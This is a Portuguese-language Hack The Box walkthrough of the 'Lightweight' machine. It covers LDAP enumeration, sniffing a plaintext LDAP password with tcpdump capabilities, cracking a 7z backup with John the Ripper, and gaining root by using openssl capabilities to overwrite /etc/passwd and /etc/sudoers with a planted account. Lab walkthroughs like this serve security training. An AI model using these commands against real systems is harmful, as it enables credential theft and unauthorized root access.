---
title: "Hack The Box - Lightweight"
tags: [Linux,Medium,Capabilities,Wireshark,Brute Force]
categories: HackTheBox
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-lightwight/L_inicial.png)

Link: <https://www.hackthebox.eu/home/machines/profile/166>

# Enumeração

## Primeiro passo é rodar o nmap contra a máquina, para verificar quais portas estão abertas e quais serviços estão sendo disponibilizados pelas portas.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-lightwight/L_nmap.png)

### Explicação de cada parâmetro do Nmap

> -sC --> Rodar alguns scripts padrão em cada porta

> -sV --> Levantar qual serviço está rodando na porta

> -Pn --> Já considera o host ativo

### Verificamos que temos 3 portas abertas no servidor

> Porta 22 - SSH

> Porta 80 - Servidor Web

> Porta 389 - LDAP

## Enumeração da porta 80

Abrimos o browser no endereço e encontramos a seguinte página web

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-lightwight/L_web.png)

Verificamos mais informações no endereço `info.php`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-lightwight/L_web1.png)

Ele nos diz como fazemos pra criar uma chave SSH com o servidor. O que é interessante aqui? Ele fala que minuto em minuto ele checa a conexão http, e se tiver um IP diferente, ele gera uma chave ssh, ou seja, tem um cron sendo executado a cada minuto.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-lightwight/L_web2.png)

Vamos prosseguir e enumerar a porta 389 (ldap)

## Enumeração da porta 389 (LDAP)

Bom, primeira coisa que podemos fazer é rodar os script do nmap pra ver o que eles no trazem sobre esse servidor ldap

`nmap -p 389 --script ldap-search 10.10.10.119`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-lightwight/L_ldap.png)

Aqui ele traz informações bacanas, tais como hash de senhas e a existencia de dois usuários na máquina `ldapuser1` e `ldapuser2` contudo esses hashs não consegui quebrar, então vamos prosseguir na enumeração

Vamos fazer de dois modos, um através da nossa conexão SSH que foi criada pelo site, sniffando o hash do usuário, outro modo através do ldapsearch, pegando os hashs dos usuários e tentando quebrar eles (não vai ser possível)

# Exploração LDAP

Agora vamos iniciar a exploração desse servidor ldap pra conseguirmos credenciais de acesso para máquina, e assim escalar privilégio

## Através do ldapsearch (Falha)

Ldapsearch é uma ferramenta muito boa quando queremos enumerar servidores ldap, ela é de fácil uso/sintaxe, contudo alguns conhecimentos básicos são pré-requisitos para utilizar ele. Ele vai fazer a mesma coisa que o script do nmap fez, a diferença é que vamos procurar entender o que está acontecendo, não apenas executar o script e pronto

Primeira coisa é tentar se autenticar no servidor ldap

`ldapsearch -x -h 10.10.10.119`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-lightwight/L_ldap1.png)

Não conseguimos, o passo agora é tentar "descobrir" qual é o `namingContexts`, não consegui entender direito do que se trata, meu conheciento em ldap é muito curto, penso que seria como se fosse (não é isso, eu sei) qual "database" ele deve ler ou procurar

`ldapsearch -x -h 10.10.10.119 -s base NamingContexts`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-lightwight/L_ldap2.png)

Uma vez de posse desses dados, agora podemos pesquisar diretamente dentro dele

`ldapsearch -x -h 10.10.10.119 -b 'dc=lightweight,dc=htb'`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-lightwight/L_ldap3.png)

Aqui estão as informações dos dois usuários existentes

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-lightwight/L_ldap4.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-lightwight/L_ldap5.png)

```
Ldapuser1
userPassword:: e2NyeXB0fSQ2JDNxeDBTRDl4JFE5eTFseVFhRktweHFrR3FLQWpMT1dkMzNOd2R oai5sNE16Vjd2VG5ma0UvZy9aLzdONVpiZEVRV2Z1cDJsU2RBU0ltSHRRRmg2ek1vNDFaQS4vNDQv

Ldapuser2
userPassword:: e2NyeXB0fSQ2JHhKeFBqVDBNJDFtOGtNMDBDSllDQWd6VDRxejhUUXd5R0ZRdmszYm9heW11QW1NWkNPZm0zT0E3T0t1bkxaWmxxeXRVcDJkdW41MDlPQkUyeHdYL1FFZmpkUlF6Z24x
```

Eles estão em base64

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-lightwight/L_ldap6.png)

Aqui poderiamos tentar quebrar ele, mas não vamos conseguir nada, então vamos para o próximo método que é fazer o sniffing da senha pela conexão ssh que foi criada quando acessamos a página

## Através do SSH (Sucesso)

Relembrando, foi criado um login ssh com meu IP

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-lightwight/L_ssh.png)

Então vamos logar pra ver o que temos nele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-lightwight/L_ssh1.png)

### Pegando a senha via LDAP (1º Modo - tcpdump na máquina)

Bom, entramos na máquina, pessoalmente eu não consegui ver nenhum ponto específico pra podermos pegar qualquer tipo de dado nessa máquina, quando fico nessa situção rodo algum script de enumeração, vamos rodar o linPEAS

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-lightwight/L_lin.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-lightwight/L_lin1.png)

> https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh

Baixamos pra nossa máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-lightwight/L_lin2.png)

Rodamos na máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-lightwight/L_lin3.png)

Única coisa "diferente" que foi visto, e explorável é o fato de estar habilitado as capabilities para o tcpdump, não é comum em uma máquina estar assim

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-lightwight/L_lin4.png)

Bom, beleza, tem alguma capabilites habilitada o tcpdump, mas pra explorar isso devemos ter alguns conceitos em mente, principalmente sobre ldap, a autenticação do ldap, por incrível que pareça é feita em plain text, sim, sem criptografia... então se conseguirmos capturar algum pacote de autenticação, vamos ter senha em texto claro... A explicação está aqui (https://www.tldp.org/HOWTO/LDAP-HOWTO/authentication.html)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-lightwight/L_lin5.png)

E como eu sei que essa 'autenticação' está sendo feita de minuto em minuto, posso tentar sniffar o login desse usuário e sendo assim pegar a senha

`tcpdump -i lo -nnXs 0 'port 389'`

Explicação tcpdump

> i lo - interface localhost

> -nn - não converter hosts nem portas para nomes

> -X - os pacotes serão printados em ASCII (mais fácil de ver)

> -s 0 - Vai pegar o pacote inteiro

> 'port 389' - vai pegar somente os pacotes na porta 389 (porta ldap)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-lightwight/L_tcp.png)

Pra poder ativar o script de cron que está sendo executado, devo clicar em status, pq assim ele atualiza os IPs que viraram chaves SSH

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-lightwight/L_tcp1.png)

Aqui está o pacote de autenticação, ele ta ruim de ver pq é pelo tcpdump

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-lightwight/L_tcp2.png)

Então se jogarmos pra um formato pcap podemos abrir pelo wireshark

`tcpdump -i lo -nnXs 0 'port 389' -w ldap.pcap`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-lightwight/L_tcp3.png)

Atualizamos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-lightwight/L_tcp1.png)

Aqui está ele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-lightwight/L_tcp5.png)

Passamos pra Kali

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-lightwight/L_tcp4.png)

Abrimos no Wireshark

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-lightwight/L_tcp6.png)

Também poderiamos pegar de outro modo essa senha, diretamente através do SSH

### Pegando a senha via LDAP (2º Modo - tcpdump no ssh)

Poderiamos fazer direto pela conexão ssh, uma vez que eu posso executar comandos na máquina por SSH. Ele automaticamente abre o Wireshark, escutando na interface localhost do servidor Lightweight

`ssh 10.10.14.40@10.10.10.119 "/usr/bin/tcpdump -i lo -U -s0 -w - 'not port 22'" | wireshark -k -i -`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-lightwight/L_tcp7.png)

Atualizamos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-lightwight/L_tcp1.png)

Ai está o bendito

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-lightwight/L_tcp8.png)

As duas opções são iguais, agora vamos prosseguir

# Escalação de privilégio (user - ldapuser2)

Senha: 8bc8251332abe1d7f105d3e53ad39ac2

O que engana nessa senha é que ela parece um hash md5, até pode ser um hash mas no caso é a senha mesmo!

Viramos o usuário `ldapuser2`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-lightwight/L_tcp9.png)

Agora devemos iniciar a escalação para o usuário `ldapuser1`

# Escalação de privilégio (ldapuser2 - ldapuser1)

Uma vez na máquina agora vamos procurar como escapar privilégio para o usuário ldapuser1, uma vez que não conseguir ir direto para root

Verificando na pasta home do usuário ldapuser2 encontramos um arquivo chamado `backup.7z`, geralmente arquivos assim são interessantes

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-lightwight/L_tcp10.png)

Passamos ele para nossa máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-lightwight/L_tcp11.png)

Verificamos que ele tem senha

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-lightwight/L_tcp12.png)

## Quebrando senha de 7z

Bom, para quebrarmos essa senha iremos utilizar uma 'ferramenta' chamada `7z2jhon` ele gera o hash em formato que o John the Ripper consegue quebrar

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-lightwight/L_tcp13.png)

Geramos o hash dele `/usr/share/john/7z2john.pl`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-lightwight/L_tcp14.png)

Agora com o john quebramos a senha dele, é relativamente rápido, tendo em vista a senha ser fácil

`john --wordlist=/usr/share/wordlists/rockyou.txt backup.hash`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-lightwight/L_tcp15.png)

Extraimos os arquivos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-lightwight/L_tcp16.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-lightwight/L_tcp17.png)

Encontramos as credenciais do `ldpauser1`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-lightwight/L_tcp18.png)

```
username = ldapuser1
password = f3ca9d298a553da117442deeb6fa932d
```

# Escalação de privilégio (ldapuser1 - root)

Bom agora, viramos ldaupser1

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-lightwight/L_tcp19.png)

Rodamos o linPEAS na máquina novamente

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-lightwight/L_tcp20.png)

Encontramos `openssl` com Capabilites=ep

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-lightwight/L_tcp21.png)

Isso quer dizer que temos tudo nele, podemos fazer oq quisermos

> https://linux-audit.com/linux-capabilities-101/

Verificamos no GTFOBins oq podemos fazer com ele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-lightwight/L_tcp22.png)

Vamos explorar alguns deles

## 1º - Lendo arquivos como root

Ai está o exemplo de como podemos ler arquivos que somente o root lê

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-lightwight/L_lendo.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-lightwight/L_lendo1.png)

## 2º - Escrevendo arquivos como root (passwd)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-lightwight/L_a.png)

A possibilidade de escrever e ler arquivos nos da diversas possibilidades de virar root na máquina. Podemos adicionar um cronjob, mudar o arquivo sudoers, adicionar senha no passwd...

Vamos escrever um login no passwd e conectar virar root, primeiro vamos fazer uma cópia do passwd na pasta de trabalho

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-lightwight/L_escrever.png)

Agora adicionamos nossa senha de root no arquivo

`echo "hacker:aaDUnysmdx4Fo:0:0:hacker:/root:/bin/bash" >> passwd.backup`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-lightwight/L_escrever1.png)

Agora sobrescrevemos o arquivo passwd original

`cat passwd.backup | ./openssl enc -out /etc/passwd`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-lightwight/L_escrever3.png)

Agora viramos root!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-lightwight/L_escrever4.png)

## 3º - Escrevendo arquivos como root (sudoers)

Vamos modificar o sudoers também, adicionando capacidades para o usuário ldapuser1

```
./openssl base64 -in /etc/sudoers | base64 -d > sudoers.backup
echo "ldapuser1    ALL=(ALL)       ALL" >> sudoers.backup
cat sudoers.backup | base64 | ./openssl enc -d -base64 -out /etc/sudoers
```

Viramos root!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-lightwight/L_a1.png)

## Pegamos as flags de user e root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-lightwight/L_root.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-lightwight/L_user.png)